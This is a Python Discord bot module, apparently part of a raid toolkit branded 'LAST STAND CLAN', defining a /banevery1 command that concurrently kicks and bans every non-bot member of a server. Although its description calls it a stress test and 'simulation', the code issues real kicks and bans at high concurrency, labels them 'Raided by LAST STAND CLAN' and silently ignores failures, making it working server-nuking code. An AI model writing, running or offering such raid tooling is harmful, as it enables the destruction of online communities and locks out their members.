"""
ban.py — LAST STAND CLAN | /banevery1: mass ban + kick all eligible members concurrently.
"""

import asyncio
import random

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG = "LAST STAND CLAN"
RAID_SHORT = "LSC"
SEM_BAN  = 20
SEM_KICK = 20


class Ban(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @app_commands.command(
        name="banevery1",
        description="☠️ Mass ban + kick all members concurrently to stress-test ban/kick protections.",
    )
    @app_commands.describe(
        intensity="Ban rate 1–10. Default 10.",
        skip_admins="Skip members with Administrator. Default False.",
        kick_first="Kick before banning (double-action flood). Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def banevery1(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        skip_admins: bool = False,
        kick_first: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != interaction.user.id
            and (not skip_admins or not m.guild_permissions.administrator)
        ]

        if not targets:
            await interaction.response.send_message("No eligible members found.", ephemeral=True)
            return

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "banevery1"

        await interaction.response.send_message(
            f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
            f"┣ Targets    : `{len(targets)}`\n"
            f"┣ Intensity  : `{intensity}/10`\n"
            f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
            f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
            f"┗ `/stop` halts immediately.",
        )

        task = asyncio.create_task(self._run(guild, targets, kick_first))
        bot_state.add_task(task)

    async def _run(
        self,
        guild: discord.Guild,
        members: list[discord.Member],
        kick_first: bool,
    ) -> None:
        sem_ban  = asyncio.Semaphore(SEM_BAN)
        sem_kick = asyncio.Semaphore(SEM_KICK)
        try:
            if kick_first:
                await asyncio.gather(
                    *[self._kick_one(guild, m, sem_kick) for m in members],
                    return_exceptions=True,
                )
            await asyncio.gather(
                *[self._ban_one(guild, m, sem_ban) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "banevery1":
                bot_state.active_simulation = None

    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(member, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(member, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    @banevery1.error
    async def banevery1_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Ban(bot))
